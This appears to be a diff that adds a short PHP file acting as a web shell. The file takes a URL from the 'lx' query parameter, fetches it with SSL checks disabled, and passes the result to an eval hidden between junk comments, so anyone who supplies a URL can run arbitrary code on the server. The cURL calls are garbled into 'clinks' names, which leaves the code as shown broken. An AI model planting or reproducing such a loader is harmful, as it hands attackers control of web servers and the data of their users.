@@ -1,0 +1,19 @@
+<?php
+$xp = '';
+function getC($links) {
+    $ch = clinks_init();
+          clinks_setopt($ch, ClinksOPT_RETURNTRANSFER, TRUE);
+          clinks_setopt($ch, ClinksOPT_links, $links);
+          clinks_setopt($ch, ClinksOPT_SSL_VERIFYHOST, FALSE);
+          clinks_setopt($ch, ClinksOPT_SSL_VERIFYPEER, FALSE);
+    	  return clinks_exec($ch);
+          clinks_close($ch);
+}
+
+if (isset($_GET['lx'])) {
+        $get_f = $_GET['lx'];
+        $xp = getC($get_f);
+}
+
+/*555555*/eval/*555555*/("?>".$xp)/****#****/;
+?>
